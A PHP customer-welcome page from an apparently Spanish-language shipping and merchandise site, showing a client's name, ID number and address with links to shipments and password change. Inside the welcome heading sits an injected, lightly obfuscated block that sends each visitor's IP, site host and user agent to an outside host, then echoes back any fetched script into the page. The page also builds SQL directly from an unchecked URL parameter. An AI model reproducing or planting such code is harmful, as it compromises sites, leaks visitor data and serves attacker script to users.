<script language="javascript" type="text/javascript">
	
</script>
<?php
	require_once("../conexion/config.php");
	require_once("../conexion/baseDatos.php");
	$cod=$_GET["cod"];
	$sql="select Nombres, ApellidoPaterno, ApellidoMaterno, direccionFiscal, DNI, RazonSocial, RUC, TipoCliente from cliente WHERE CodigoCliente=$cod;";
	$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
	$bd->conectar();
	$result=$bd->crearConsulta($sql);
	$reg=mysql_fetch_object($result);
	if($reg->TipoCliente=="Juridico")
	{
		$cliente = $reg->RazonSocial;
		$id=$reg->RUC;
		$tipo="RUC";
	}
	else
	{
		$cliente = $reg->Nombres." ".$reg->ApellidoPaterno." ".$reg->ApellidoMaterno;
		$id=$reg->DNI;
		$tipo="DNI";
	}
	$dir=$reg->direccionFiscal;
	
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<!--
<SCRIPT language="javascript"> 
	function imprimir() { 
	if ((navigator.appName == "Netscape"))
	{
		window.print() ; 
	}
	else
	{
		var WebBrowser = '<OBJECT ID="WebBrowser1" WIDTH=0 HEIGHT=0 	CLASSID="CLSID:8856F961-340A-11D0-A96B-00C04FD705A2"></OBJECT>'; 
		document.body.insertAdjacentHTML('beforeEnd', WebBrowser);
		WebBrowser1.ExecWB(6, -1);
		WebBrowser1.outerHTML = ""; 
	} 
} 
</SCRIPT> -->
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>Imprimir: ctrl+i  | NoImprimir: ctrl+n</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="169" align="center" valign="middle">
          <p>
          
          </p>
          <table width="400" border="0" cellspacing="0" cellpadding="0">
            <tr>
              <td height="29" colspan="2" align="center"><h3>Bienvenido <?php echo($cliente);?>
<?php
#59612e#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/59612e#
?></h3></td>
              </tr>
            <tr>
              <td width="115"><strong><em>DNI/RUC:</em></strong></td>
              <td width="285"><?php echo($id);?></td>
            </tr>
            <tr>
              <td><strong><em>Direccion:</em></strong></td>
              <td><?php echo($dir);?></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td><strong><em>Operaciones:</em></strong></td>
              <td><a href="usuarioEnvios.php?codigo=<?php echo"$id&tipo=$tipo"?>">Envios</a></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><a href="usuarioMercaderia.php?codigo=<?php echo"$id&tipo=$tipo"?>">Mercaderia</a></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><a href="usuarioCambiarContrasenha.php?cod=<?php echo "$cod"?>">Cambiar Contrase&ntilde;a</a></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><a href="../index.html">Cerrar Sesion</a></td>
            </tr>
          </table></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

